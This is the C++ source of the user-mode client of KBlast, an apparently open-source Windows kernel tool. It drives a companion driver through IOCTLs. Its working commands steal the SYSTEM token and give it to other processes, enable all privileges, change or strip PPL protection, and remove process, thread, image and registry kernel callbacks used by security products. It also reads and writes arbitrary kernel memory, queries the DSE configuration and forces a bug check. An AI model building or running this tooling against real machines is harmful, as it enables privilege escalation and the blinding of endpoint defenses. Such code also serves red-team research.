/*
* Author:	Angelo Frasca Caccia ( lem0nSec_ )
* Title:	KBlast.exe ( client )
* Website:	https://github.com/lem0nSec/KBlast
*/


#include "KBlast_c_device_dispatch.hpp"


KBLAST_HELP_MENU Generic_Cmds[] = {
	{L"help", L"Show this help"},
	{L"quit", L"Quit KBlast"},
	{L"cls", L"Clear the screen"},
	{L"banner", L"Print KBlast banner"},
	{L"pid", L"Show current pid"},
	{L"time", L"Display system time"},
	{L"version", L"Display system version information"},
	{L"!{cmd}", L"Execute system command"}
};

KBLAST_HELP_MENU Misc_Cmds[] = {
	{L"bsod", L"Guess what this command does"},
	{L"dse", L"Print current DSE configuration"},
};

KBLAST_HELP_MENU Prot_Cmds[] = {
	{L"wintcb", L"Enable PPL full(wintcb)"},
	{L"lsa", L"Enable PPL light(lsa)"},
	{L"antimalware", L"Enable PPL light(antimalware)"},
	{L"none", L"Disable PPL"}
};

KBLAST_HELP_MENU Tokn_Cmds[] = {
	{L"enablepriv", L"Enable all privileges for a given process"},
	{L"disablepriv", L"Disable all privileges for a given process"},
	{L"steal", L"Steal token and give it to a given process"},
	{L"restore", L"Restore the original token of a given process"}
};

KBLAST_HELP_MENU Call_Cmds[] = {
	{L"process", L"Process creation kernel callbacks"},
	{L"thread", L"Thread creation kernel callbacks"},
	{L"image", L"Image loading kernel callbacks"},
	{L"reg", L"Registry kernel callbacks"}
};

KBLAST_HELP_MENU Proc_Cmds[] = {
	{L"list", L"List active processes"},
	{L"unlink", L"Unlink process"}
};

KBLAST_HELP_MENU Blob_Cmds[] = {
	{L"describe", L"describe container"},
	{L"save", L"save blob"},
	{L"clear", L"clear container"},
	{L"read", L"read @ address"},
	{L"write", L"write @ address"}
};

wchar_t Proc_Examples[] =
L"$ process /action:list\n"
L"$ process /action:terminate /pid:123 - ( terminate process 123 )\n";

wchar_t Call_Examples[] =
L"$ callback /type:process /action:list\n"
L"$ callback /type:process /action:remove /pointer:ffffffff12121212\n";

wchar_t Tokn_Examples[] =
L"$ token /action:enablepriv /pid:123 - ( enable all privileges for process 123 )\n"
L"$ token /action:disablepriv /pid:123 - ( disable all privileges for process 123 )\n"
L"$ token /action:steal /pid:4 /targetpid:123 - ( replace 123's token with System's [ 4 ] )\n"
L"$ token /action:revert /pid:123 - ( revert 123's token [ ! experimental ! ] )\n";

wchar_t Prot_Examples[] =
L"$ protection /type:wintcb /pid:123\n";

wchar_t Misc_Examples[] =
L"$ misc /action:bsod";

wchar_t Blob_Examples[] =
L"$ blob /action:save /blob:90909090\n"
L"$ blob /action:describe /container:1\n"
L"$ blob /action:clear /container:1\n"
L"$ blob /action:read /pointer:ffffffff12121212 /size:50\n"
L"$ blob /action:write /pointer:ffffffff12121212 /container:1\n";

wchar_t Generic_Examples[] = L"No example is available for ' generic ' commands\n";


void KBlast_c_module_help(HELP_MENU help)
{
	DWORD i = 0, maxSize = 0;
	PKBLAST_HELP_MENU menu = 0;
	wchar_t* examples = 0;

	switch (help)
	{
	case CALLBACKS:
		wprintf(L"\nCommands - ' callback ' ( kernel callbacks interactions )\n");
		menu = (PKBLAST_HELP_MENU)&Call_Cmds;
		maxSize = sizeof(Call_Cmds) / sizeof(KBLAST_HELP_MENU);
		examples = Call_Examples;
		break;

	case TOKEN:
		wprintf(L"\nCommands - ' token ' ( token manipulation interactions )\n");
		menu = (PKBLAST_HELP_MENU)&Tokn_Cmds;
		maxSize = sizeof(Tokn_Cmds) / sizeof(KBLAST_HELP_MENU);
		examples = Tokn_Examples;
		break;

	case PROTECTION:
		wprintf(L"\nCommands - ' protection ' ( process protection interactions )\n");
		menu = (PKBLAST_HELP_MENU)&Prot_Cmds;
		maxSize = sizeof(Prot_Cmds) / sizeof(KBLAST_HELP_MENU);
		examples = Prot_Examples;
		break;

	case MISC:
		wprintf(L"\nCommands - ' misc ' ( misc functionalities. Kernel memory reading/writing interactions, etc... )\n");
		menu = (PKBLAST_HELP_MENU)&Misc_Cmds;
		maxSize = sizeof(Misc_Cmds) / sizeof(KBLAST_HELP_MENU);
		examples = Misc_Examples;
		break;

	case PROCESS:
		wprintf(L"\nCommands - ' process ' ( process manipulation interactions )\n");
		menu = (PKBLAST_HELP_MENU)&Proc_Cmds;
		maxSize = sizeof(Proc_Cmds) / sizeof(KBLAST_HELP_MENU);
		examples = Proc_Examples;
		break;

	case BLOBS:
		wprintf(L"\nCommands - ' blob ' ( blob & containers interactions )\n");
		menu = (PKBLAST_HELP_MENU)&Blob_Cmds;
		maxSize = sizeof(Blob_Cmds) / sizeof(KBLAST_HELP_MENU);
		examples = Blob_Examples;
		break;

	case GENERIC:
		wprintf(L"\nCommands - ' generic ' ( generic commands. Do not initiate kernel interactions )\n");
		menu = (PKBLAST_HELP_MENU)&Generic_Cmds;
		maxSize = sizeof(Generic_Cmds) / sizeof(KBLAST_HELP_MENU);
		examples = Generic_Examples;
		break;

	default:
		break;
	}

	if (maxSize != 0)
	{
		for (i = 0; i < maxSize; i++)
		{
			wprintf(L"\t%10s:\t%s\n", menu[i].Command, menu[i].Description);
		}
		wprintf(L"\nExamples:\n%s\n", examples);
	}

}


BOOL KBlast_c_device_control(IN DWORD ControlCode, IN OPTIONAL LPVOID pCommandLine, IN OPTIONAL DWORD szIn, OUT OPTIONAL LPVOID outBuffer, IN OPTIONAL DWORD szOutBuffer)
{
	BOOL status = FALSE;
	HANDLE hDriver = 0;
	DWORD bsReturned = 0;

	hDriver = CreateFile(KBLAST_DRV_FILENAME, GENERIC_ALL, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
	if (hDriver != INVALID_HANDLE_VALUE)
	{
		status = DeviceIoControl(hDriver, ControlCode, pCommandLine, szIn, outBuffer, szOutBuffer, &bsReturned, 0);
		CloseHandle(hDriver);
	}

	return status;

}

BOOL KBlaster_c_device_dispatch_process(wchar_t* input)
{
	BOOL status = FALSE;
	KBLAST_COMMANDLINE_ARGUMENTS pArgs = { 0 };
	KBLAST_BUFFER pBuffer = { 0 };
	ULONG64 ProcNumber = 0;
	KBLAST_FULL_PROCESS_INFORMATION pFullProcInfo = { 0 };
	PKBLAST_PROCESS_INFORMATION pCurrentProcessInfo = 0;
	char* realInput = 0;
	int argc = 0;

	realInput = KBlast_c_utils_UnicodeStringToAnsiString(input);
	argc = KBlast_c_utils_GetCommandlineArguments(realInput, &pArgs);

	if (pArgs.action != NULL)
	{
		if (strcmp(pArgs.action, "list") == 0)
		{
			pBuffer.pointer = &pFullProcInfo;
			status = KBlast_c_device_control(KBLASTER_IOCTL_PROCESS_LIST, NULL, NULL, (LPVOID)pBuffer.pointer, sizeof(KBLAST_FULL_PROCESS_INFORMATION));
			if (pFullProcInfo.ProcNumber != 0)
			{
				pFullProcInfo.pProcInformation = (PKBLAST_PROCESS_INFORMATION)LocalAlloc(LPTR, (sizeof(KBLAST_PROCESS_INFORMATION) * pFullProcInfo.ProcNumber));
				if (pFullProcInfo.pProcInformation != NULL)
				{
					status = KBlast_c_device_control(KBLASTER_IOCTL_PROCESS_LIST, NULL, NULL, (LPVOID)pBuffer.pointer, sizeof(KBLAST_FULL_PROCESS_INFORMATION));
				}
			}
		}
		else if (strcmp(pArgs.action, "unlink") == 0)
		{
			printf("[i] This functionality has not been implemented yet.\n");
		}
		else if (strcmp(pArgs.action, "terminate") == 0)
		{
			pBuffer.uGeneric = pArgs.pid;
			if (pBuffer.uGeneric > 0)
			{
				printf("[!] Terminating process %lu...\n", pBuffer.uGeneric);
				status = KBlast_c_device_control(KBLASTER_IOCTL_PROCESS_TERMINATE, (LPVOID)&pBuffer, sizeof(KBLAST_BUFFER), NULL, NULL);
			}
		}
		else
			KBlast_c_module_help(PROCESS);

		if ((NT_SUCCESS(status)) && (strcmp(pArgs.action, "list") == 0))
		{
			for (ProcNumber = 0; ProcNumber < pFullProcInfo.ProcNumber; ProcNumber++)
			{
				pCurrentProcessInfo = (PKBLAST_PROCESS_INFORMATION)((PBYTE)pFullProcInfo.pProcInformation + (sizeof(KBLAST_PROCESS_INFORMATION) * ProcNumber));
				if (pArgs.name != NULL)
				{	
					if (StrStrIA((char*)pCurrentProcessInfo->ImageFileName, (char*)pArgs.name) != 0)
					{
						printf(
							"\n[+] %s\n\t[+] EPROCESS\t: 0x%-016p\n\t[+] TOKEN\t: 0x%-016p\n\t[+] UNIQUE_PID\t: %d\n\t[+] PPL\t\t: [ %d - %d - %d - %d ]\n\n",
							(char*)pCurrentProcessInfo->ImageFileName, pCurrentProcessInfo->Eprocess, pCurrentProcessInfo->Token, (int)pCurrentProcessInfo->UniqueProcessId,
							(int)pCurrentProcessInfo->ProtectionInformation.SignatureLevel, (int)pCurrentProcessInfo->ProtectionInformation.SectionSignatureLevel, (int)pCurrentProcessInfo->ProtectionInformation.Protection.Type,
							(int)pCurrentProcessInfo->ProtectionInformation.Protection.Signer
						);
					}
				}
				else
				{
					printf(
						"\n[+] %s\n\t[+] EPROCESS\t: 0x%-016p\n\t[+] TOKEN\t: 0x%-016p\n\t[+] UNIQUE_PID\t: %d\n\t[+] PPL\t\t: [ %d - %d - %d - %d ]\n\n",
						(char*)pCurrentProcessInfo->ImageFileName, pCurrentProcessInfo->Eprocess, pCurrentProcessInfo->Token, (int)pCurrentProcessInfo->UniqueProcessId,
						(int)pCurrentProcessInfo->ProtectionInformation.SignatureLevel, (int)pCurrentProcessInfo->ProtectionInformation.SectionSignatureLevel, (int)pCurrentProcessInfo->ProtectionInformation.Protection.Type,
						(int)pCurrentProcessInfo->ProtectionInformation.Protection.Signer
					);
				}
			}
		}
		SecureZeroMemory(pFullProcInfo.pProcInformation, LocalSize(pFullProcInfo.pProcInformation));
		SecureZeroMemory(&pFullProcInfo, sizeof(KBLAST_FULL_PROCESS_INFORMATION));
		LocalFree(pFullProcInfo.pProcInformation);

	}
	else
		KBlast_c_module_help(PROCESS);

	SecureZeroMemory(&pArgs, sizeof(KBLAST_COMMANDLINE_ARGUMENTS));
	KBlast_c_utils_FreeAnsiString(realInput);

	return status;

}


BOOL KBlast_c_device_dispatch_blob(wchar_t* input)
{
	BOOL status = FALSE;
	KBLAST_COMMANDLINE_ARGUMENTS pArgs = { 0 };
	KBLAST_BUFFER pBuffer = { 0 };
	PKBLAST_BUFFER pOutBufferGeneric = 0;
	PKBLAST_MEMORY_BUFFER pBuf = 0;
	PKBLAST_MEMORY_BUFFER pOutBuf = 0;
	char* realInput = 0;
	int argc = 0;
	DWORD i = 0;
	HMODULE hCi = 0;
	PVOID pCiInitialize = 0;
	ULONG offset = 0;

	realInput = KBlast_c_utils_UnicodeStringToAnsiString(input);
	argc = KBlast_c_utils_GetCommandlineArguments(realInput, &pArgs);

	if (pArgs.action != NULL)
	{
		if (strcmp(pArgs.action, "save") == 0)
		{
			status = status = KBlast_c_blob_manage(pArgs.blob, NULL, NULL, BLOB_SAVE);
		}
		else if (strcmp(pArgs.action, "clear") == 0)
		{
			status = KBlast_c_blob_manage(NULL, (int)pArgs.container, NULL, BLOB_DELETE);
		}
		else if (strcmp(pArgs.action, "describe") == 0)
		{
			status = KBlast_c_blob_manage(NULL, (int)pArgs.container, NULL, BLOB_INFO);
		}
		else if (strcmp(pArgs.action, "write") == 0)
		{
			if ((pArgs.pointer != NULL) && (pArgs.container > 0))
			{
				pBuf = (PKBLAST_MEMORY_BUFFER)LocalAlloc(LPTR, sizeof(KBLAST_MEMORY_BUFFER));
				if (pBuf != 0)
				{
					status = KBlast_c_blob_manage((LPCSTR)pArgs.pointer, (int)pArgs.container, pBuf, BLOB_WRITE);
					if (status == TRUE)
					{
						printf("Pointer\t: 0x%-016p\nSize\t: %lu\nAction\t: %s\n |\n | > Request submitted!\n", pBuf->ptr, pBuf->size, pArgs.action);
						status = KBlast_c_device_control(KBLASTER_IOCTL_MEMORY_WRITE, (LPVOID)pBuf, sizeof(KBLAST_MEMORY_BUFFER), NULL, NULL);
					}
					LocalFree(pBuf);
				}
			}
		}
		else if (strcmp(pArgs.action, "read") == 0)
		{
			if ((pArgs.size > 0) && (pArgs.pointer != 0))
			{
				pBuf = (PKBLAST_MEMORY_BUFFER)LocalAlloc(LPTR, sizeof(KBLAST_MEMORY_BUFFER));
				if (pBuf != 0)
				{
					pBuf->size = (ULONG)pArgs.size;
					pBuf->ptr = pArgs.pointer;
					if ((pBuf->size != 0) && (pBuf->ptr != 0))
					{
						pOutBuf = (PKBLAST_MEMORY_BUFFER)LocalAlloc(LPTR, sizeof(KBLAST_MEMORY_BUFFER));
						if (pOutBuf != 0)
						{
							printf("Pointer\t: 0x%-016p\nSize\t: %lu\nAction\t: %s\n", pBuf->ptr, pBuf->size, pArgs.action);
							status = KBlast_c_device_control(KBLASTER_IOCTL_MEMORY_READ, (LPVOID)pBuf, sizeof(KBLAST_MEMORY_BUFFER), (LPVOID)pOutBuf, sizeof(KBLAST_MEMORY_BUFFER));
							if (status == TRUE)
							{
								pOutBuf->size = pBuf->size;
								status = KBlast_c_blob_manage(NULL, NULL, pOutBuf, BLOB_READ);
							}
							LocalFree(pOutBuf);
						}
					}
					LocalFree(pBuf);
				}
			}
		}
		else
			KBlast_c_module_help(BLOBS);
	}
	else
		KBlast_c_module_help(BLOBS);

	SecureZeroMemory(&pArgs, sizeof(KBLAST_COMMANDLINE_ARGUMENTS));
	KBlast_c_utils_FreeAnsiString(realInput);

	return status;

}


BOOL KBlast_c_device_dispatch_misc(wchar_t* input)
{
	BOOL status = FALSE;
	KBLAST_COMMANDLINE_ARGUMENTS pArgs = { 0 };
	KBLAST_BUFFER pBuffer = { 0 };
	PKBLAST_BUFFER pOutBufferGeneric = 0;
	char* realInput = 0;
	int argc = 0;
	HMODULE hCi = 0;
	PVOID pCiInitialize = 0;
	ULONG offset = 0;

	realInput = KBlast_c_utils_UnicodeStringToAnsiString(input);
	argc = KBlast_c_utils_GetCommandlineArguments(realInput, &pArgs);

	if (pArgs.action != NULL)
	{
		if (strcmp(pArgs.action, "bsod") == 0)
		{
			status = KBlast_c_device_control(KBLASTER_IOCTL_BUG_CHECK, NULL, NULL, NULL, NULL);
		}
		else if (strcmp(pArgs.action, "dse") == 0)
		{
			hCi = GetModuleHandle(L"CI.dll");
			if (hCi == 0)
			{
				hCi = LoadLibraryEx(L"CI.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);
			}
			pCiInitialize = GetProcAddress(hCi, "CiInitialize");
			if (pCiInitialize != 0)
			{
				pOutBufferGeneric = (PKBLAST_BUFFER)LocalAlloc(LPTR, sizeof(KBLAST_BUFFER));
				if (pOutBufferGeneric != 0)
				{
					pBuffer.uGeneric = (ULONG)((DWORD_PTR)pCiInitialize - (DWORD_PTR)hCi);
					status = KBlast_c_device_control(KBLASTER_IOCTL_DSE, (LPVOID)&pBuffer, sizeof(KBLAST_BUFFER), (LPVOID)pOutBufferGeneric, sizeof(KBLAST_BUFFER));
					if (status == TRUE)
					{
						printf("[+] g_CiOptions : 0x%-016p\n[+] DSE : 0x%04lx\n", pOutBufferGeneric->pointer, pOutBufferGeneric->uGeneric);
						RtlZeroMemory(pOutBufferGeneric, sizeof(KBLAST_BUFFER));
						LocalFree(pOutBufferGeneric);
					}
				}
			}
		}
		else
			KBlast_c_module_help(MISC);
	}
	else
		KBlast_c_module_help(MISC);

	SecureZeroMemory(&pArgs, sizeof(KBLAST_COMMANDLINE_ARGUMENTS));
	KBlast_c_utils_FreeAnsiString(realInput);

	return status;

}


BOOL KBlast_c_device_dispatch_protection(wchar_t* input)
{
	BOOL status = FALSE;
	KBLAST_COMMANDLINE_ARGUMENTS pArgs = { 0 };
	KBLAST_USER_PROCESS_INFORMATION procInfo = { 0 };
	KBLAST_BUFFER pBuffer = { 0 };
	char* realInput = 0;
	int argc = 0;
	
	realInput = KBlast_c_utils_UnicodeStringToAnsiString(input);
	argc = KBlast_c_utils_GetCommandlineArguments(realInput, &pArgs);

	if ((pArgs.type != NULL) && (pArgs.pid > 0))
	{
		procInfo.processID = (DWORD)pArgs.pid;
		if (KBlast_c_utils_ListProcessInformation(&procInfo))
		{
			if (strcmp(pArgs.type, "wintcb") == 0)
			{
				pBuffer.integer1 = pArgs.pid;
				printf("PID\t: %d\nImage\t: %ws\nOwner\t: %ws\nPPL\t: %s\n |\n | > Request submitted!\n\n", procInfo.processID, procInfo.ImageFileName, procInfo.TokenOwner, pArgs.type);
				status = KBlast_c_device_control(KBLASTER_IOCTL_PROTECT_WINTCB, (LPVOID)&pBuffer, sizeof(KBLAST_BUFFER), NULL, NULL);
			}
			else if (strcmp(pArgs.type, "lsa") == 0)
			{
				pBuffer.integer1 = pArgs.pid;
				printf("PID\t: %d\nImage\t: %ws\nOwner\t: %ws\nPPL\t: %s\n |\n | > Request submitted!\n\n", procInfo.processID, procInfo.ImageFileName, procInfo.TokenOwner, pArgs.type);
				status = KBlast_c_device_control(KBLASTER_IOCTL_PROTECT_LSA, (LPVOID)&pBuffer, sizeof(KBLAST_BUFFER), NULL, NULL);
			}
			else if (strcmp(pArgs.type, "antimalware") == 0)
			{
				pBuffer.integer1 = pArgs.pid;
				printf("PID\t: %d\nImage\t: %ws\nOwner\t: %ws\nPPL\t: %s\n |\n | > Request submitted!\n\n", procInfo.processID, procInfo.ImageFileName, procInfo.TokenOwner, pArgs.type);
				status = KBlast_c_device_control(KBLASTER_IOCTL_PROTECT_ANTIMALWARE, (LPVOID)&pBuffer, sizeof(KBLAST_BUFFER), NULL, NULL);
			}
			else if (strcmp(pArgs.type, "none") == 0)
			{
				pBuffer.integer1 = pArgs.pid;
				printf("PID\t: %d\nImage\t: %ws\nOwner\t: %ws\nPPL\t: %s\n |\n | > Request submitted!\n\n", procInfo.processID, procInfo.ImageFileName, procInfo.TokenOwner, pArgs.type);
				status = KBlast_c_device_control(KBLASTER_IOCTL_PROTECT_NONE, (LPVOID)&pBuffer, sizeof(KBLAST_BUFFER), NULL, NULL);
			}
			else
				KBlast_c_module_help(PROTECTION);
		}
		else
			PRINT_FUNCTION_ERROR("pid\n");
	}
	else
		KBlast_c_module_help(PROTECTION);

	SecureZeroMemory(&pArgs, sizeof(KBLAST_COMMANDLINE_ARGUMENTS));
	SecureZeroMemory(&procInfo, sizeof(KBLAST_USER_PROCESS_INFORMATION));
	KBlast_c_utils_FreeAnsiString(realInput);

	return status;

}


BOOL KBlast_c_device_dispatch_token(wchar_t* input)
{
	BOOL status = FALSE;
	KBLAST_COMMANDLINE_ARGUMENTS pArgs = { 0 };
	KBLAST_USER_PROCESS_INFORMATION procInfo = { 0 };
	KBLAST_USER_PROCESS_INFORMATION procTargetInfo = { 0 };
	KBLAST_BUFFER pBuffer = { 0 };
	char* realInput = 0;
	int argc = 0;

	// add a functionality to retrieve token information ( ptr in _EX_FAST_REF & 0xf --> zero out RefCnt )
	realInput = KBlast_c_utils_UnicodeStringToAnsiString(input);
	argc = KBlast_c_utils_GetCommandlineArguments(realInput, &pArgs);
	
	if (pArgs.action != NULL)
	{
		if (pArgs.pid != 0)
		{
			procInfo.processID = pArgs.pid;
			if (KBlast_c_utils_ListProcessInformation(&procInfo))
			{
				if (strcmp(pArgs.action, "enablepriv") == 0)
				{
					pBuffer.integer1 = pArgs.pid;
					printf("PID\t: %d\nImage\t: %ws\nOwner\t: %ws\nAction\t: privileges full\n |\n | > Request submitted!\n\n", procInfo.processID, procInfo.ImageFileName, procInfo.TokenOwner);
					status = KBlast_c_device_control(KBLASTER_IOCTL_TOKEN_PRIVILEGES_ENABLEALL, &pBuffer, sizeof(KBLAST_BUFFER), NULL, NULL);
				}
				else if (strcmp(pArgs.action, "disablepriv") == 0)
				{
					pBuffer.integer1 = pArgs.pid;
					printf("PID\t: %d\nImage\t: %ws\nOwner\t: %ws\nAction\t: privileges none\n |\n | > Request submitted!\n\n", procInfo.processID, procInfo.ImageFileName, procInfo.TokenOwner);
					status = KBlast_c_device_control(KBLASTER_IOCTL_TOKEN_PRIVILEGES_DISABLEALL, &pBuffer, sizeof(KBLAST_BUFFER), NULL, NULL);
				}
				else if (strcmp(pArgs.action, "steal") == 0)
				{
					if (pArgs.targetpid != 0)
					{
						procTargetInfo.processID = pArgs.targetpid;
						if (KBlast_c_utils_ListProcessInformation(&procTargetInfo))
						{
							pBuffer.integer2 = pArgs.pid;
							pBuffer.integer1 = pArgs.targetpid;
							printf("PID\t: %d\nImage\t: %ws\nOwner\t: %ws\n |\n |\n Target\t: %d\n Image\t: %ws\n Owner\t: %ws\n Action\t: %s\n  |\n  | > Request submitted!\n", procInfo.processID, procInfo.ImageFileName, procInfo.TokenOwner, procTargetInfo.processID, procTargetInfo.ImageFileName, procTargetInfo.TokenOwner, pArgs.action);
							status = KBlast_c_device_control(KBLASTER_IOCTL_TOKEN_STEAL, &pBuffer, sizeof(KBLAST_BUFFER), NULL, NULL);
						}
					}
					else
						PRINT_FUNCTION_ERROR(L"Target pid\n");
				}
				else if (strcmp(pArgs.action, "revert") == 0)
				{
					pBuffer.integer1 = pArgs.pid;
					printf("PID\t: %d\nImage\t: %ws\nOwner\t: %ws\nAction\t: %s\n |\n | > Request submitted!\n\n", procInfo.processID, procInfo.ImageFileName, procInfo.TokenOwner, pArgs.action);
					status = KBlast_c_device_control(KBLASTER_IOCTL_TOKEN_RESTORE, &pBuffer, sizeof(KBLAST_BUFFER), NULL, NULL);
				}
				else
					KBlast_c_module_help(TOKEN);
			}
			else
				PRINT_FUNCTION_ERROR(L"pid\n");
		}
		else
			KBlast_c_module_help(TOKEN);
	}
	else
		KBlast_c_module_help(TOKEN);

	SecureZeroMemory(&pArgs, sizeof(KBLAST_COMMANDLINE_ARGUMENTS));
	SecureZeroMemory(&procInfo, sizeof(KBLAST_USER_PROCESS_INFORMATION));
	SecureZeroMemory(&procTargetInfo, sizeof(KBLAST_USER_PROCESS_INFORMATION));
	KBlast_c_utils_FreeAnsiString(realInput);

	return status;

}


BOOL KBlast_c_device_dispatch_callbacks(wchar_t* input)
{
	BOOL status = FALSE;
	KBLAST_COMMANDLINE_ARGUMENTS pArgs = { 0 };
	KBLAST_BUFFER pBuffer = { 0 };
	PPROCESS_KERNEL_CALLBACK_STORAGE pOutBuffer = 0;
	DWORD i = 0;
	char* realInput = 0;
	int argc = 0;


	realInput = KBlast_c_utils_UnicodeStringToAnsiString(input);
	argc = KBlast_c_utils_GetCommandlineArguments(realInput, &pArgs);

	if (pArgs.action != NULL)
	{
		if ((strcmp(pArgs.action, "list") == 0) && (pArgs.type != NULL))
		{
			pOutBuffer = (PPROCESS_KERNEL_CALLBACK_STORAGE)LocalAlloc(LPTR, sizeof(PROCESS_KERNEL_CALLBACK_STORAGE));
			if (pOutBuffer != 0)
			{
				if (strcmp(pArgs.type, "process") == 0)
				{
					status = KBlast_c_device_control(KBLASTER_IOCTL_CALLBACK_PROCESS_LIST, NULL, NULL, (LPVOID)pOutBuffer, sizeof(PROCESS_KERNEL_CALLBACK_STORAGE));
				}
				else if (strcmp(pArgs.type, "thread") == 0)
				{
					status = KBlast_c_device_control(KBLASTER_IOCTL_CALLBACK_THREAD_LIST, NULL, NULL, (LPVOID)pOutBuffer, sizeof(PROCESS_KERNEL_CALLBACK_STORAGE));
				}
				else if (strcmp(pArgs.type, "image") == 0)
				{
					status = KBlast_c_device_control(KBLASTER_IOCTL_CALLBACK_IMAGE_LIST, NULL, NULL, (LPVOID)pOutBuffer, sizeof(PROCESS_KERNEL_CALLBACK_STORAGE));
				}
				else if (strcmp(pArgs.type, "reg") == 0)
				{
					status = KBlast_c_device_control(KBLASTER_IOCTL_CALLBACK_REGISTRY_LIST, NULL, NULL, (LPVOID)pOutBuffer, sizeof(PROCESS_KERNEL_CALLBACK_STORAGE));
				}
			}
		}
		else if (strcmp(pArgs.action, "remove") == 0)
		{
			if ((pArgs.pointer != 0) && (pArgs.type != NULL))
			{
				pBuffer.pointer = pArgs.pointer;
				if (strcmp(pArgs.type, "process") == 0)
				{
					printf("Pointer\t: 0x%-016p\nC.Type\t: %s\nAction\t: %s\n |\n | > Request submitted!\n", pBuffer.pointer, pArgs.type, pArgs.action);
					status = KBlast_c_device_control(KBLASTER_IOCTL_CALLBACK_PROCESS_REMOVE, (LPVOID)&pBuffer, sizeof(KBLAST_BUFFER), NULL, NULL);
				}
				else if (strcmp(pArgs.type, "thread") == 0)
				{
					printf("Pointer\t: 0x%-016p\nC.Type\t: %s\nAction\t: %s\n |\n | > Request submitted!\n", pBuffer.pointer, pArgs.type, pArgs.action);
					status = KBlast_c_device_control(KBLASTER_IOCTL_CALLBACK_THREAD_REMOVE, (LPVOID)&pBuffer, sizeof(KBLAST_BUFFER), NULL, NULL);
				}
				else if (strcmp(pArgs.type, "image") == 0)
				{
					printf("Pointer\t: 0x%-016p\nC.Type\t: %s\nAction\t: %s\n |\n | > Request submitted!\n", pBuffer.pointer, pArgs.type, pArgs.action);
					status = KBlast_c_device_control(KBLASTER_IOCTL_CALLBACK_IMAGE_REMOVE, (LPVOID)&pBuffer, sizeof(KBLAST_BUFFER), NULL, NULL);
				}
				else if (strcmp(pArgs.type, "reg") == 0)
				{
					printf("Pointer\t: 0x%-016p\nC.Type\t: %s\nAction\t: %s\n |\n | > Request submitted!\n", pBuffer.pointer, pArgs.type, pArgs.action);
					status = KBlast_c_device_control(KBLASTER_IOCTL_CALLBACK_REGISTRY_REMOVE, (LPVOID)&pBuffer, sizeof(KBLAST_BUFFER), NULL, NULL);
				}
				else
					KBlast_c_module_help(CALLBACKS);
			}
			else
				KBlast_c_module_help(CALLBACKS);
		}
		else
			KBlast_c_module_help(CALLBACKS);
	}
	else
		KBlast_c_module_help(CALLBACKS);

	if ((status == TRUE) && (strcmp(pArgs.action, "list") == 0))
	{
		ULONG offset = 0;
		char* name = 0;
		for (i = 0; i < pOutBuffer->CallbackQuota; i++)
		{
			offset = (ULONG)((DWORD_PTR)pOutBuffer->CallbackInformation[i].CallbackFunctionPointer - (DWORD_PTR)pOutBuffer->CallbackInformation[i].ModuleInformation.ModuleBase);
			name = KBlast_c_utils_GetImageNameByFullPath(pOutBuffer->CallbackInformation[i].ModuleInformation.ModuleFullPathName);
			if (pOutBuffer->CallbackInformation[i].CallbackHandle != 0)
			{
				printf(
					"\n[+] %s\n\t\t[+] Handle : 0x%-016p\n\t\t[+] Pointer : 0x%-016p ( %s + %lu )\n",
					name, (PVOID)pOutBuffer->CallbackInformation[i].CallbackHandle, (PVOID)pOutBuffer->CallbackInformation[i].CallbackFunctionPointer, name, offset
				); // format 2
			}
			else
			{
				printf(
					"\n[+] %s\n\t\t[+] Pointer/Handle : 0x%-016p ( %s + %lu )\n",
					name, (PVOID)pOutBuffer->CallbackInformation[i].CallbackFunctionPointer, name, offset
				); // format 2
			}
		}
		offset = 0;
		name = 0;

		RtlZeroMemory(pOutBuffer, sizeof(PROCESS_KERNEL_CALLBACK_STORAGE));
		LocalFree(pOutBuffer);

	}

	SecureZeroMemory(&pArgs, sizeof(KBLAST_COMMANDLINE_ARGUMENTS));
	KBlast_c_utils_FreeAnsiString(realInput);

	return status;
}